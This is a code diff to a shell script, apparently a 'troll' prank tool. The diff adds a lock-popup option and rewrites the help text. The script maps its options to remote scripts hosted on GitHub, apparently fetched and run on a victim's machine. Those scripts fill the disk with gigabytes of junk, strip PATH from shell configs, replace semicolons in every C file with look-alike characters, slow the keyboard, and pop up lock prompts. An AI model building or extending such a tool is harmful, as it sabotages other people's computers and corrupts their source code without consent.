@@ -7,7 +7,23 @@ githubloc="https://raw.githubusercontent.com/Poul0s/42-troll/master"
 
 case "$1" in
 	--help)
-		printf "TODO LATER \nArguments : \n\n--help : show help\n\n-F | --full-disk : add 5G of random files everywhere\n\n-P | --where-are-commands : remove PATH from .zshrc and .bashrc\n\n-S | --replace-semicolon : replace all semcolon by a fake semicolon of file passed in arg 2 (tip : ~/**/*.c for all .c )\n\n-SK | --replace-key-semicolon\n\n-E | --emoji-font : set emoji font\n\n-KW | --keyboard-wtf : add a random delay to keyboard each 50 secs\n"
+		printf "Arguments :
+
+		--help : show help
+
+		-F | --full-disk : add 5G of random files everywhere
+
+		-P | --where-are-commands : remove PATH from .zshrc and .bashrc
+
+		-S | --replace-semicolon : replace all semcolon by a fake semicolon of file passed in arg 2 (tip : ~/**/*.c for all .c )
+
+		-SK | --replace-key-semicolon
+
+		-E | --emoji-font : set emoji font
+
+		-KW | --keyboard-wtf : add a random delay to keyboard each 50 secs
+
+		-L | --ask-lock : add ask lock popup each 30 secs"
 	;;
 	--full-disk|-F)
 		scriptlocation="$githubloc/full_disk.sh"
@@ -27,6 +43,9 @@ case "$1" in
 	;;
 	--keyboard-wtf|-KW)
 		scriptlocation="$githubloc/keyboard-wtf.sh"
+	;;
+	--ask-lock|-L)
+		scriptlocation="$githubloc/asklock.sh"
 	;;
 	*)
 		echo "arg '$1' invalid, show help with --help"
